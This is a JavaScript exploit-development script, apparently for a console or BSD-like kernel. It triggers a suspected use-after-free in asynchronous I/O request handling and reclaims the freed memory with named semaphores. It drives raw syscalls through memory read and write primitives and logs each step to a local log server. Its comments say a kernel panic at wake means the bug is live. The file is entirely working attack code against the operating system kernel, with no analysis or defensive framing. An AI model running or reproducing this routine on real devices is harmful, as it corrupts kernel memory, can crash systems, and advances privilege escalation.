// 16_reclaimwake.js — fire + osem reclaim + WAKE. MAY PANIC (that IS the signal).
// Clean-through = latent/invisible; panic AT WAKE = waker hit dangling state (UAF live).
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[r16] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const step = async (tag, fn) => {
        shout("r16: " + tag); say(tag); await pace();
        try { const r = await fn(); shout(("r16: " + tag + "=" + String(r)).slice(0,110)); say(tag + "=" + String(r)); await pace(); return r; }
        catch (e) { shout("r16: " + tag + " THREW"); say(tag + " threw"); await pace(); return null; }
    };
    await step("start", async () => "RECLAIM+WAKE (may panic)");
    await step("init", async () => await syscall(0x29En, 0n,0n,0n,0n,0n,0n));
    let rfd = -1, wfd = -1;
    await step("pipe", async () => {
        const a = malloc(8); write64(a, 0n);
        const r = await syscall(0x2AFn, a, 0n,0n,0n,0n,0n);
        try {
            const fds = read64(a);
            rfd = Number(fds & 0xFFFFFFFFn); wfd = Number((fds >> 32n) & 0xFFFFFFFFn);
        } catch (e) {}
        return String(r) + " r=" + rfd + " w=" + wfd;
    });
    let ids = 0n, states = 0n;
    await step("fill", async () => {
        const RB = 0x28;
        const reqs = malloc(RB * 2);
        for (let i = 0; i < RB * 2; i += 8) write64(reqs + BigInt(i), 0n);
        for (let i = 0; i < 2; i++) write32(reqs + BigInt(i * RB + 0x20), rfd);
        ids = malloc(8); states = malloc(8);
        write32(ids, 0n); write32(ids + 4n, 0n);
        write32(states, 0n); write32(states + 4n, 0n);
        const r = await syscall(0x29Dn, 0x1001n, reqs, 2n, 3n, ids, 0n);
        return String(r);
    });
    const osemIds = [];
    await step("reclaim-4osem", async () => {
        const out = [];
        for (let i = 0; i < 4; i++) {
            const tag = "WAKE000" + i;
            const nm = malloc(16);
            for (let j = 0; j < 16; j++) write8(nm + BigInt(j), 0);
            for (let j = 0; j < tag.length; j++) write8(nm + BigInt(j), tag.charCodeAt(j) & 255);
            const at = malloc(0x20);
            for (let j = 0; j < 0x20; j++) write8(at + BigInt(j), 0);
            write32(at, 1); write32(at + 8n, 1);
            let r = null;
            try { r = await syscall(0x225n, nm, at, 0n, 0n, 0n, 0n); } catch (e) { r = "THREW"; }
            out.push(tag + "=" + String(r));
            try { if (typeof r === "bigint" && r >= 0n) osemIds.push(r); } catch (e) {}
        }
        return out.join(" ");
    });
    await step("FIRE", async () => await syscall(0x297n, ids, 2n, states, 0n, 0n, 0n));
    await step("WAKE-write", async () => {
        const wb = malloc(4); write8(wb, 0x57);
        return await syscall(0x04n, BigInt(wfd), wb, 1n, 0n, 0n, 0n);
    });
    await step("settle", async () => {
        for (let i = 0; i < 200; i++) { try { await syscall(0x14Bn, 0n,0n,0n,0n,0n,0n); } catch (e) {} }
        return "yielded200";
    });
    await step("delete-ids", async () => {
        let a = null, b = null;
        try { a = await syscall(0x29An, ids, 2n, states, 0n, 0n, 0n); } catch (e) { a = "THREW"; }
        try { b = await syscall(0x296n, ids, 2n, states, 0n, 0n, 0n); } catch (e) { b = "THREW"; }
        return "cancel=" + String(a) + " del=" + String(b);
    });
    await step("verdict", async () => "alive-through-wake (latent) OR see panic timing above");
    try { if (rfd >= 0) await syscall(0x06n, BigInt(rfd), 0n,0n,0n,0n,0n); } catch (e) {}
    try { if (wfd >= 0) await syscall(0x06n, BigInt(wfd), 0n,0n,0n,0n,0n); } catch (e) {}
    await step("done", async () => "ok");
})()
